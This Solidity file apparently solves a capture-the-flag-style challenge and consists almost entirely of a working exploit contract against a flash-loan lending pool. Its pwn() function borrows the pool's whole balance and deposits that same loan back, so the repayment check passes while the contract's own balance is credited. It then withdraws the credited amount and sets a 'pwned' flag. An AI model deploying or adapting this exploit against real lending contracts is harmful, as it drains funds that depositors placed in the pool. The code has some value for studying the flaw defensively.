// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Interface for the EthLendingPool contract.
interface IEthLendingPool {
    // Function to get the balance of a specific address in the pool.
    function balances(address) external view returns (uint);

    // Function to deposit ETH into the pool.
    function deposit() external payable;

    // Function to withdraw a specific amount from the pool.
    function withdraw(uint _amount) external;

    // Function to execute a flash loan.
    function flashLoan(uint amount, address target, bytes calldata data) external;
}

contract EthLendingPoolExploit {
    // Address of the target EthLendingPool contract.
    IEthLendingPool public pool;
    
    // Boolean to track whether the exploit was successful.
    bool public pwned;

    // Constructor to set the target EthLendingPool contract address.
    constructor(address _pool) {
        pool = IEthLendingPool(_pool);
    }
    
    // Receive function to accept incoming ETH from the pool's withdraw.
    receive() external payable {}
    
    // Function to deposit ETH into the pool.
    function deposit() external payable {
        // Call the deposit function of the target pool, sending the received ETH.
        pool.deposit{value: msg.value}();
    }
    
    // Function to perform the exploit.
    function pwn() external {
        // Get the current balance of the target pool.
        uint bal = address(pool).balance;
        
        // 1. Call the flashLoan function to initiate a flash loan for the entire pool balance.
        //    Pass the address of this contract as the target and encode the "deposit()" function call.
        pool.flashLoan(bal, address(this), abi.encodeWithSignature("deposit()"));
        
        // 3. Withdraw the full balance of this contract from the pool.
        pool.withdraw(pool.balances(address(this)));
        
        // Set the pwned flag to true to indicate a successful exploit.
        pwned = true;
    }
}